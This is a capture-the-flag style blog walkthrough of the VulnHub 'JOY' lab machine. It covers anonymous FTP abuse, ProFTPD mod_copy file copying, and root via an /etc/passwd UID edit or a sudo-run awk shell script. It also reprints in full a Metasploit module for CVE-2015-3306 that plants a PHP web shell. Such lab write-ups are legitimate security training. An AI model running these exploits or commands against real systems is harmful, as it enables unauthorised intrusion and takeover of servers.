<p>If you MUST have hints for this machine (even though they will probably not help you very much until you root the box!): Joy is (#1): <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=9AvWs2X-bEA">https://www.youtube.com/watch?v=9AvWs2X-bEA</a>, (#2): something that should be replicated, (#3): what happens when you clean out seemingly â€œhiddenâ€ closets.</p>
<p>Note: There are at least two reliable ways of obtaining user privileges and rooting this machine. Have fun. ğŸ˜ƒ</p>
<p>Feel free to contact the author at <a target="_blank" rel="noopener" href="https://donavan.sg/blog">https://donavan.sg/blog</a> if you would like to drop a comment.</p>
<p>Download Linkï¼š<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/digitalworldlocal-joy,298/">https://www.vulnhub.com/entry/digitalworldlocal-joy,298/</a></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<p><strong>Scanning</strong></p>
<ul>
<li>Nmap</li>
</ul>
<p><strong>Enumeration</strong></p>
<ul>
<li>FTP anonymous login</li>
</ul>
<p><strong>Exploit</strong></p>
<ul>
<li>Exploit proftpd using Metasploit</li>
</ul>
<p><strong>Privilege Escalation</strong></p>
<ul>
<li>Sudo right</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<p>æ‰«æç½‘æ®µï¼Œå‘ç°é¶æœºIPåœ°å€<code>192.168.0.108</code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227133714.png" alt=""></p>
<p>æ‰«æé¶æœºç«¯å£ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227143203.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227143240.png" alt=""></p>
<p>å‘ç°FTPæ˜¯å¯ä»¥åŒ¿åç™»å½•çš„ï¼Œç›´æ¥ä½¿ç”¨FileZillaå·¥å…·ç™»å½•ç«™ç‚¹æŸ¥çœ‹æ–‡ä»¶</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227160828.png" alt=""></p>
<p>ä¸€è·¯çœ‹ä¸‹æ¥å‘ç°directoryæ–‡ä»¶åˆ—å‡ºäº†<code>/home/patrick</code>ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå‰”é™¤ä¸€äº›å¸¸è§çš„å’Œéšæœºç”Ÿæˆçš„æ–‡ä»¶ä¹‹å¤–ï¼Œå°±å‰©ä¸‹<code>verison_control</code>å€¼å¾—çœ‹ä¸€çœ‹ï¼Œç”¨ä¸‹é¢çš„å‘½ä»¤æŠŠæ–‡ä»¶å¤åˆ¶åˆ°FTPç«™ç‚¹ç›®å½•ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227161330.png" alt=""></p>
<blockquote>
<p>telnetå’Œftpå‘½ä»¤çš„åŒºåˆ«ï¼š</p>
<p>telnetè¿æ¥åï¼Œç”¨æˆ·ä¸»æœºå®é™…æˆä¸ºè¿œç¨‹TELNETæœåŠ¡å™¨çš„ä¸€ä¸ªè™šæ‹Ÿç»ˆç«¯ï¼ˆæˆ–ç§°æ˜¯å“‘ç»ˆç«¯ï¼‰ï¼Œä¸€åˆ‡æœåŠ¡å®Œå…¨åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œä½†ç”¨æˆ·å†³ä¸èƒ½ä»è¿œç¨‹æœåŠ¡å™¨ä¸­ä¸‹è½½æˆ–ä¸Šä¼ æ–‡ä»¶ï¼Œæˆ–æ‹·è´æ–‡ä»¶åˆ°ç”¨æˆ·ä¸»æœºä¸­æ¥ã€‚</p>
<p>ftpåˆ™ä¸åŒï¼Œå®ƒæ˜¯é‡‡ç”¨å®¢æˆ·æœº/æœåŠ¡å™¨æ¨¡å¼ï¼Œç”¨æˆ·èƒ½å¤Ÿæ“ä½œFTPæœåŠ¡å™¨ä¸­çš„ç›®å½•ï¼Œä¸Šä¼ æˆ–ä¸‹è½½æ–‡ä»¶ï¼Œä½†ç”¨æˆ·ä¸èƒ½è¯·æ±‚æœåŠ¡å™¨æ‰§è¡ŒæŸä¸ªæ–‡ä»¶ã€‚</p>
</blockquote>
<p><code>version_control</code>æ–‡ä»¶å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Version Control of External-Facing Services:</span><br><span class="line"></span><br><span class="line">Apache: 2.4.25</span><br><span class="line">Dropbear SSH: 0.34</span><br><span class="line">ProFTPd: 1.3.5</span><br><span class="line">Samba: 4.5.12</span><br><span class="line"></span><br><span class="line">We should switch to OpenSSH and upgrade ProFTPd.</span><br><span class="line"></span><br><span class="line">Note that we have some other configurations in this machine.</span><br><span class="line">1. The webroot is no longer &#x2F;var&#x2F;www&#x2F;html. We have changed it to &#x2F;var&#x2F;www&#x2F;tryingharderisjoy.</span><br><span class="line">2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.</span><br></pre></td></tr></table></figure>
<p>æç¤ºæˆ‘ä»¬<code>ProFTP</code>éœ€è¦å‡çº§ï¼Œæˆ‘ä»¬å…ˆä»è¿™å…¥æ‰‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227161634.png" alt=""></p>
<p>ç›´æ¥ä¸ŠMetasploitï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227161932.png" alt=""></p>
<p>è¿”å›ä¸€ä¸ªæ ‡å‡†Shellï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227162733.png" alt=""></p>
<p>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æœ‰å“ªäº›æ–‡ä»¶ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227165542.png" alt=""></p>
<p>æœ‰ä¸€ä¸ª<code>L37ISF8.php</code>æ–‡ä»¶æ˜¯åˆšåˆšexpç”Ÿæˆçš„ï¼Œæ¥ç€çœ‹ossecç›®å½•ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227165716.png" alt=""></p>
<p>æœ‰ä¸€ä¸ªæ¯”è¾ƒå¯ç–‘çš„æ–‡ä»¶<code>patricksecretsofjoy</code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227165805.png" alt=""></p>
<p>æœ‰patrickç”¨æˆ·çš„ç™»å½•å¯†ç ï¼Œrootçš„å¯†ç ç®—æ˜¯ä½œè€…çš„æ¶æå§ã€‚ç›´æ¥ç™»å½•patrickç”¨æˆ·ï¼Œå°è¯•ææƒï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228164812.png" alt=""></p>
<p>åˆ°è¿™é‡Œå°±æœ‰ä¸¤ç§æ€è·¯ç”¨æ¥ææƒï¼š</p>
<ol>
<li>
<p>åˆ©ç”¨<code>/home/patrick/script/test</code>çš„è„šæœ¬æ–‡ä»¶æ¥æ›´æ”¹<code>/etc/passwd</code>çš„æƒé™ï¼Œè¿›è€Œä¿®æ”¹patrickç”¨æˆ·çš„æƒé™ï¼›</p>
</li>
<li>
<p>ä¸Šä¼ è‡ªå·±ç¼–å†™çš„è„šæœ¬è‡³ç›¸åŒçš„ç›®å½•ã€‚è¿™é‡Œå°±æ–‡å­—å™è¿°ä¸€ä¸‹å…·ä½“è¿‡ç¨‹ï¼š</p>
<p>a) é¦–å…ˆåœ¨æœ¬æœºä¸Šç¼–å†™Shellè„šæœ¬<code>echo &quot;awk 'BEGIN &#123;system(\&quot;/bin/bash\&quot;)&#125;'&quot; &gt; test</code>ï¼›</p>
<p>b) å†ä½¿ç”¨ftpä¸Šä¼ åˆ°<code>upload</code>ç›®å½•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.108</span><br><span class="line">cd upload</span><br><span class="line">put test</span><br></pre></td></tr></table></figure>
<p>c) å†ä½¿ç”¨telnetä¼ å…¥åˆ°<code>/home/patrick/script</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.0.108 21</span><br><span class="line">site cpfr &#x2F;home&#x2F;ftp&#x2F;upload&#x2F;test</span><br><span class="line">site cpto &#x2F;home&#x2F;patrick&#x2F;script&#x2F;test</span><br></pre></td></tr></table></figure>
<p>d) å†æ‰§è¡Œ<code>test</code>æ–‡ä»¶<code>sudo /home/patrick/script/test</code></p>
</li>
</ol>
<p>ç›¸å¯¹è€Œè¨€ç¬¬ä¸€ä¸ªæ€è·¯ä¼šæ¯”è¾ƒç®€å•ï¼Œä¿®æ”¹æƒé™ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228192822.png" alt=""></p>
<p>ä¿®æ”¹Patrickç”¨æˆ·çš„uidå’Œgidï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228213715.png" alt=""></p>
<blockquote>
<p>è¿™é‡Œå¯ä»¥ç›´æ¥ç™»å½•é¶æœºç”¨nanoä¿®æ”¹ï¼Œä½†æ˜¯å¦‚ä½•åœ¨ä¸»æœºä¸Šçš„åå¼¹shellä¿®æ”¹å‘¢ï¼Ÿå› ä¸ºåå¼¹shellä¸æ”¯æŒvim, vi, nanoç­‰äº¤äº’å¼çª—å£ï¼Œä½†æ˜¯åˆ«å¿˜äº†è¿˜æœ‰ä¸€ä¸ª<code>sed</code>å‘½ä»¤å¯ä»¥ç”¨æ¥ç¼–è¾‘æ–‡ä»¶ï¼Œ<code>sed '36,36s/1000:1000/0:0/g' /etc/passwd</code>ï¼Œä¸Šé¢è¿™ä¸ªå‘½ä»¤è¡¨ç¤ºä¿®æ”¹<code>/etc/passwd</code>æ–‡ä»¶ä¸­çš„ç¬¬36è¡Œï¼ŒæŠŠ<code>1000:1000</code>æ›¿æ¢æˆ<code>0:0</code></p>
</blockquote>
<p>é‡æ–°ç™»å½•ä¸€ä¸‹å°±å¯ä»¥è·å¾—rootæƒé™äº†ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228214224.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228214233.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228214248.png" alt=""></p>
<h2 id="0x04-ProFTP-1-3-5-exp">0x04 ProFTP 1.3.5 exp</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: http://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msf/core&#x27;</span></span><br><span class="line"></span><br><span class="line">class Metasploit3 &lt; Msf::Exploit::Remote</span><br><span class="line"></span><br><span class="line">  Rank = ExcellentRanking</span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> Msf::Exploit::Remote::Tcp</span><br><span class="line">  <span class="keyword">include</span> Msf::Exploit::Remote::HttpClient</span><br><span class="line"></span><br><span class="line">  def initialize(info = &#123;&#125;)</span><br><span class="line">    super(update_info(info,</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span>           =&gt; <span class="string">&#x27;ProFTPD 1.3.5 Mod_Copy Command Execution&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span>    =&gt; %q&#123;</span><br><span class="line">          This module exploits the SITE CPFR/CPTO commands in ProFTPD version <span class="number">1.3</span><span class="number">.5</span>.</span><br><span class="line">          Any unauthenticated client can leverage these commands to copy files <span class="keyword">from</span> any</span><br><span class="line">          part of the filesystem to a chosen destination. The copy commands are executed with</span><br><span class="line">          the rights of the ProFTPD service, which by <span class="keyword">default</span> runs under the privileges of the</span><br><span class="line">          <span class="string">&#x27;nobody&#x27;</span> user. By using /proc/<span class="built_in">self</span>/cmdline to copy a PHP payload to the website</span><br><span class="line">          <span class="built_in">directory</span>, PHP remote code execution is made possible.</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span>         =&gt;</span><br><span class="line">        [</span><br><span class="line">          <span class="string">&#x27;Vadim Melihow&#x27;</span>, <span class="comment"># Original discovery, Proof of Concept</span></span><br><span class="line">          <span class="string">&#x27;xistence &lt;xistence[at]0x90.nl&gt;&#x27;</span> <span class="comment"># Metasploit module</span></span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;License&#x27;</span>        =&gt; MSF_LICENSE,</span><br><span class="line">      <span class="string">&#x27;References&#x27;</span>     =&gt;</span><br><span class="line">        [</span><br><span class="line">          [ <span class="string">&#x27;CVE&#x27;</span>, <span class="string">&#x27;2015-3306&#x27;</span> ],</span><br><span class="line">          [ <span class="string">&#x27;EDB&#x27;</span>, <span class="string">&#x27;36742&#x27;</span> ]</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;Privileged&#x27;</span>     =&gt; <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&#x27;Platform&#x27;</span>       =&gt; [ <span class="string">&#x27;unix&#x27;</span> ],</span><br><span class="line">      <span class="string">&#x27;Arch&#x27;</span>           =&gt; ARCH_CMD,</span><br><span class="line">      <span class="string">&#x27;Payload&#x27;</span>        =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&#x27;BadChars&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;Compat&#x27;</span>      =&gt;</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="string">&#x27;PayloadType&#x27;</span> =&gt; <span class="string">&#x27;cmd&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;RequiredCmd&#x27;</span> =&gt; <span class="string">&#x27;generic gawk bash python perl&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">      <span class="string">&#x27;Targets&#x27;</span>        =&gt;</span><br><span class="line">        [</span><br><span class="line">          [ <span class="string">&#x27;ProFTPD 1.3.5&#x27;</span>, &#123; &#125; ]</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&#x27;Apr 22 2015&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    register_options(</span><br><span class="line">      [</span><br><span class="line">        OptPort.<span class="keyword">new</span>(<span class="string">&#x27;RPORT&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;HTTP port&#x27;</span>, <span class="number">80</span>]),</span><br><span class="line">        OptPort.<span class="keyword">new</span>(<span class="string">&#x27;RPORT_FTP&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;FTP port&#x27;</span>, <span class="number">21</span>]),</span><br><span class="line">        OptString.<span class="keyword">new</span>(<span class="string">&#x27;TARGETURI&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;Base path to the website&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]),</span><br><span class="line">        OptString.<span class="keyword">new</span>(<span class="string">&#x27;TMPPATH&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;Absolute writable path&#x27;</span>, <span class="string">&#x27;/tmp&#x27;</span>]),</span><br><span class="line">        OptString.<span class="keyword">new</span>(<span class="string">&#x27;SITEPATH&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;Absolute writable website path&#x27;</span>, <span class="string">&#x27;/var/www&#x27;</span>])</span><br><span class="line">      ], <span class="built_in">self</span>.<span class="keyword">class</span>)</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def check</span><br><span class="line">    ftp_port = datastore[<span class="string">&#x27;RPORT_FTP&#x27;</span>]</span><br><span class="line">    sock = Rex::Socket.create_tcp(<span class="string">&#x27;PeerHost&#x27;</span> =&gt; rhost, <span class="string">&#x27;PeerPort&#x27;</span> =&gt; ftp_port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sock.nil?</span><br><span class="line">      fail_with(Failure::Unreachable, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failed to connect to FTP server&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      print_status(<span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Connected to FTP server&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;220&#x27;</span>)</span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure retrieving ProFTPD 220 OK banner&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    sock.puts(<span class="string">&quot;SITE CPFR /etc/passwd\r\n&quot;</span>)</span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;350&#x27;</span>)</span><br><span class="line">      Exploit::CheckCode::Vulnerable</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      Exploit::CheckCode::Safe</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def exploit</span><br><span class="line">    ftp_port = datastore[<span class="string">&#x27;RPORT_FTP&#x27;</span>]</span><br><span class="line">    get_arg = rand_text_alphanumeric(<span class="number">5</span>+rand(<span class="number">3</span>))</span><br><span class="line">    payload_name = rand_text_alphanumeric(<span class="number">5</span>+rand(<span class="number">3</span>)) + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"></span><br><span class="line">    sock = Rex::Socket.create_tcp(<span class="string">&#x27;PeerHost&#x27;</span> =&gt; rhost, <span class="string">&#x27;PeerPort&#x27;</span> =&gt; ftp_port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sock.nil?</span><br><span class="line">      fail_with(Failure::Unreachable, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failed to connect to FTP server&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      print_status(<span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Connected to FTP server&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;220&#x27;</span>)</span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure retrieving ProFTPD 220 OK banner&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    print_status(<span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Sending copy commands to FTP server&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sock.puts(<span class="string">&quot;SITE CPFR /proc/self/cmdline\r\n&quot;</span>)</span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;350&#x27;</span>)</span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying from /proc/self/cmdline&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    sock.put(<span class="string">&quot;SITE CPTO #&#123;datastore[&#x27;TMPPATH&#x27;]&#125;/.&lt;?php passthru(<span class="subst">$_GET</span>[\&#x27;#&#123;get_arg&#125;\&#x27;]);?&gt;\r\n&quot;</span>)</span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;250&#x27;</span>)</span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying to temporary payload file&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    sock.put(<span class="string">&quot;SITE CPFR #&#123;datastore[&#x27;TMPPATH&#x27;]&#125;/.&lt;?php passthru(<span class="subst">$_GET</span>[\&#x27;#&#123;get_arg&#125;\&#x27;]);?&gt;\r\n&quot;</span>)</span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;350&#x27;</span>)</span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying from temporary payload file&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    sock.put(<span class="string">&quot;SITE CPTO #&#123;datastore[&#x27;SITEPATH&#x27;]&#125;/#&#123;payload_name&#125;\r\n&quot;</span>)</span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;250&#x27;</span>)</span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying PHP payload to website path, directory not writable?&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    sock.close</span><br><span class="line"></span><br><span class="line">    print_status(<span class="string">&quot;#&#123;peer&#125; - Executing PHP payload #&#123;target_uri.path&#125;#&#123;payload_name&#125;&quot;</span>)</span><br><span class="line">    res = send_request_cgi!(</span><br><span class="line">      <span class="string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, payload_name),</span><br><span class="line">      <span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;vars_get&#x27;</span> =&gt; &#123; get_arg =&gt; <span class="string">&quot;nohup #&#123;payload.encoded&#125; &amp;&quot;</span> &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    unless res &amp;&amp; res.code == <span class="number">200</span></span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure executing payload&quot;</span>)</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
</div>


  <div class="book-comments">
    


    <div id="disqus_thread"></div>
    <script>
    (function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://ca01h.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
    </script>
    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>



  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image 
    <div class="author-img">
      
        <figure
          class="avatar avatar-lg"
          data-initial="c"
          style="background-color: #3b4351;">
        </figure>
      
    </div> -->

    <!-- Author title
    <div class="author-title">
      <div>ca01h</div>
      <div>2020-02-29</div>
    </div> -->
	
	<script src="https://www.hackthebox.eu/badge/212159"></script>
  </div> 

  
    <div class="divider"></div>

    <div class="link">
	  <i class="fas fa-folder-open"></i>&nbsp;
      <a class="category-link" href="/categories/%E9%9D%B6%E6%9C%BA/">é¶æœº</a>-><a class="category-link" href="/categories/%E9%9D%B6%E6%9C%BA/VulnHub/">VulnHub</a>
	  </br>
	  <i class="fas fa-tags"></i>&nbsp;
      <a class="tag-none-link" href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag">#é¶æœº</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
	  
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

<div align="center">
	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span id="busuanzi_container_site_pv">Copyright Â© ca01h 2019-2020 | æœ¬ç«™æ€»è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡</span>
<!-- <span class="post-meta-divider">|</span> -->
<!-- <span id="busuanzi_container_site_uv">æœ¬ç«™è®¿å®¢æ•°<span id="busuanzi_value_site_uv"></span>äºº</span> -->
</div><!-- hexo-inject:begin --><!-- hexo-inject:end -->

</body>
</html>



<script src="/js/book.js"></script>
